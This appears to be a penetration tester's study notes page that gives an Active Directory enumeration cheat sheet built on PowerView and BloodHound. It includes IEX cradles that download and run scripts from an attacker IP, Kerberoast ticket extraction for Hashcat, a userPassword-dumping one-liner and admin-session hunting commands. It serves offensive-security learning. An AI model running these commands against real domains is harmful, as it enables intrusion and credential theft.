---
description: AD is 40 points. The AD set is key. As is enumeration.
cover: https://www.crowdstrike.com/wp-content/uploads/2020/12/Blog_1060x698-5-1.jpg
coverY: 0
---

# AD Enumeration

## CheatSheet

[GitHub - PowerShellMafia/PowerSploit at dev](https://github.com/PowerShellMafia/PowerSploit/tree/dev)

IEX (Run program remotely — Does not write to disk)

```python
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.17/PowerView.ps1')
```

## Post-Compromise Enumeration

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" %}

* Transfer PowerView.ps1 to target

### Get Domain Users

```python
Get-NetUser * -Domain corp.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset, lastlogontimestamp,accountexpires,admincount,userprincipalname, serviceprincipalname, mail,useraccountcontrol | Export-CSV users.csv
```

### Get Domain Computers

```python
Get-NetComputer * -Domain corp.local | Select-Object -Property dnshostname,operatingsystem,operatingsystemservicepack,lastlogontimestamp | Export-CSV computers.csv
```

### SPN Ticket Request

```python
Get-DomainUser * -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv .\\ticket.csv -NoTypeInformation
```

### Enumerating User DACLs

```python
PS C:\\> Get-DomainObjectAcl -Identity it_admin -ResolveGUIDs ? { $_.SecurityIdentifier -Match $(ConvertTo-SID burmat) }

AceType               : AccessAllowed
ObjectDN              : CN=it_admin,CN=Users,DC=BURMAT,DC=CO
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-2736429227-4547413232-2815246478-1130
InheritanceFlags      : None
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-2736429227-4547413232-2815246478-1107
AccessMask            : 983551
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed
```

### BloodHound — Ingestor Launch

```python
IEX(New-Object Net.WebClient).DownloadString('http://<IP>/ps/SharpHound.ps1');
Invoke-BloodHound -CollectionMethod All -CompressData -SkipPing;
```

After this step is completed, you will receive a zip file in the same directory. Set up an SMB server using smbserver.py which can be found in [#smb-server](../file-transfer.md#smb-server "mention")

Transfer this information to your BloodHound and begin visual analysis.

## PowerView

### What is PowerView?

PowerView is a reconnaissance tool written in PowerShell that an attacker can use post compromise to further enumerate a box.

### GitHub Repo

{% embed url="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon" %}
For reference
{% endembed %}

### PowerView.ps1

This script contains a number of different methods that can be loaded and used to enumerate the domain. In order to run the script properly, we need to change our execution policy.

#### Changing Execution Policy:

```
#Change the current execution policy
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser

#Load the script via "dot sourcing"
. .\PowerView.ps1
```

### The basics

#### Preparation:

```
$currentFunctions = Get-ChildItem function:
. .\PowerView.ps1
$scriptFunctions = Get-ChildItem function: | Where-Object { $currentFunctions -notcontains $_ }
$scriptFunctions | Format-Wide -Column 4
```

#### Getting Started:

<mark style="color:orange;">**NOTE: You can use the help command before a cmdlet if additional clarity is needed.**</mark>

View OS version, IP address, Domain, Forest, etc.

```
Get-NetDomainController
```

View a list of policies

```
Get-DomainPolicy
```

View a specific policy

```
(Get-DomainPolicy)."system access"
```

View a list of all users

```
Get-NetUser
```

View useful information about the users

```
Get-UserProperty
```

```
Get-NetUser -AdminCount | Select-Object displayname,samaccountname
```

```
Get-UserProperty
```

```
Get-UserProperty -Properties lastlogon
```

```
Get-UserProperty -Properties logoncount
```

Gaining more information about machines in the domain

```
Get-NetComputer
```

```
Get-NetComputer -FullData
```

Find more information about shares available in the domain

```
Invoke-ShareFinder
```

## Quick Enumeration

```
Get-NetDomain #Basic domain info
#User info
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount #Basic user enabled info
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN #Kerberoastable users
#Groups info
Get-NetGroup | select samaccountname, admincount, description
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName #Get AdminSDHolders
#Computers
Get-NetComputer | select samaccountname, operatingsystem
Get-NetComputer -Unconstrained | select samaccountname #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth | select samaccountname #Find computers with Constrained Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups
#Shares
Find-DomainShare -CheckShareAccess #Search readable shares
#Domain trusts
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
#LHF
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess
#Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
Invoke-UserHunter -CheckAccess
#Find interesting ACLs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl
```

## Domain Info

```
# Domain Info
Get-Domain #Get info about the current domain
Get-NetDomain #Get info about the current domain
Get-NetDomain -Domain mydomain.local
Get-DomainSID #Get domain SID

# Policy
Get-DomainPolicy #Get info about the policy
(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."SystemAccess" #Password policy
Get-DomainPolicyData | select -ExpandProperty SystemAccess #Same as previous
(Get-DomainPolicy).PrivilegeRights #Check your privileges
Get-DomainPolicyData # Same as Get-DomainPolicy

# Domain Controller
Get-DomainController | select Forest, Domain, IPAddress, Name, OSVersion | fl # Get specific info of current domain controller
Get-NetDomainController -Domain mydomain.local #Get all ifo of specific domain Domain Controller

# Get Forest info 
Get-ForestDomain
```

## Users, Groups, Computers & OUs

```
# Users
## Get usernames and their groups
Get-DomainUser -Properties name, MemberOf | fl
## Get-DomainUser and Get-NetUser are kind of the same
Get-NetUser #Get users with several (not all) properties
Get-NetUser | select -ExpandProperty samaccountname #List all usernames
Get-NetUser -UserName student107 #Get info about a user
Get-NetUser -properties name, description #Get all descriptions
Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount  #Get all pwdlastset, logoncount and badpwdcount
Find-UserField -SearchField Description -SearchTerm "built" #Search account with "something" in a parameter

# Users Filters
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname #All enabled users
Get-NetUser -UACFilter ACCOUNTDISABLE #All disabled users
Get-NetUser -UACFilter SMARTCARD_REQUIRED #Users that require a smart card
Get-NetUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname #Not smart card users
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Get-Netuser -TrustedToAuth #Useful for Kerberos constrain delegation
Get-NetUser -AllowDelegation -AdminCount #All privileged users that aren't marked as sensitive/not for delegation
# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}

#Groups
Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName
## Get-DomainGroup is similar to Get-NetGroup 
Get-NetGroup #Get groups
Get-NetGroup -Domain mydomain.local #Get groups of an specific domain
Get-NetGroup 'Domain Admins' #Get all data of a group
Get-NetGroup -AdminCount #Search admin grups
Get-NetGroup -UserName "myusername" #Get groups of a user
Get-NetGroupMember -Identity "Administrators" -Recurse #Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups also
Get-NetGroupMember -Identity "Enterprise Admins" -Domain mydomain.local #Remember that "Enterprise Admins" group only exists in the rootdomain of the forest
Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups #Get Local groups of a machine (you need admin rights in no DC hosts)
Get-NetLocalGroupMember -computername dcorp-dc.dollarcorp.moneycorp.local #Get users of localgroups in computer
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs #Check AdminSDHolder users
Get-NetGPOGroup #Get restricted groups

# Computers
Get-DomainComputer -Properties DnsHostName # Get all domain maes of computers
## Get-DomainComputer is kind of the same as Get-NetComputer
Get-NetComputer #Get all computer objects
Get-NetComputer -Ping #Send a ping to check if the computers are working
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth #Find computers with Constrined Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups

#OU
Get-DomainOU -Properties Name | sort -Property Name #Get names of OUs
Get-DomainOU "Servers" | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties Name} #Get all computers inside an OU (Servers in this case)
## Get-DomainOU is kind of the same as Get-NetOU
Get-NetOU #Get Organization Units
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_} #Get all computers inside an OU (StudentMachines in this case)
```

## Logons & Sessions

```
Get-NetLoggedon -ComputerName <servername> #Get net logon users at the moment in a computer (need admins rights on target)
Get-NetSession -ComputerName <servername> #Get active sessions on the host
Get-LoggedOnLocal -ComputerName <servername> #Get locally logon users at the moment (need remote registry (default in server OS))
Get-LastLoggedon -ComputerName <servername> #Get last user logged on (needs admin rigths in host)
Get-NetRDPSession -ComputerName <servername> #List RDP sessions inside a host (needs admin rights in host)
```

## GPOs

```
#GPO
Get-DomainGPO | select displayName
## Get-DomainGPO and Get-NetGPO are similar
Get-NetGPO #Get all policies with details
Get-NetGPO | select displayname #Get the names of the policies
Get-NetGPO -ComputerName <servername> #Get the policy applied in a computer
gpresult /V #Get current policy

# Get who can create new GPOs
powershell Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=invented,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Enumerate permissions for GPOs where users with RIDs of > 1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Transform SID to name
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126

# Get GPO of an OU
Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'

# Returns all GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences.
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName, GPOType

# Enumerates the machines where a specific domain user/group is a member of a specific local group.
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
```

## ACLs

```
Get-ObjectAcl -SamAccountName <username> -ResolveGUIDs #Get ACLs of an object (permissions of other objects over the indicated one)
Get-PathAcl -Path "\\dc.mydomain.local\sysvol" #Get permissions of a file
Find-InterestingDomainAcl -ResolveGUIDs #Find intresting ACEs (Interesting permisions of "unexpected objects" (RID>1000 and modify permissions) over other objects
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"} #Check if any of the interesting permissions founds is realated to a username/group
Get-NetGroupMember -GroupName "Administrators" -Recurse | ?{$_.IsGroup -match "false"} | %{Get-ObjectACL -SamAccountName $_.MemberName -ResolveGUIDs} | select ObjectDN, IdentityReference, ActiveDirectoryRights #Get special rights over All administrators in domain
```

## Low-Hanging Fruit (Target First if Possible)

```
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl

#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess

#(This time you need to give the list of computers in the domain) Do the same as before but trying to execute a WMI action in each computer (admin privs are needed to do so). Useful if RCP and SMB ports are closed.
.\Find-WMILocalAdminAccess.ps1 -ComputerFile .\computers.txt

#Enumerate machines where a particular user/group identity has local admin rights
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>

# Enumerates the members of specified local group (default administrators)
# for all the targeted machines on the current (or specified) domain.
Invoke-EnumerateLocalAdmin
Find-DomainLocalGroupMember

#Search unconstrained delegation computers and show users
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

#Admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation

#Get members from Domain Admins (default) and a list of computers
# and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host.
# If -Checkaccess, then it also check for LocalAdmin access in the hosts.
## By default users inside Domain Admins are searched
Find-DomainUserLocation [-CheckAccess] | select UserName, SessionFromName
Invoke-UserHunter [-CheckAccess]

#Search "RDPUsers" users
Invoke-UserHunter -GroupName "RDPUsers"

#It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)
Invoke-UserHunter -Stealth
```













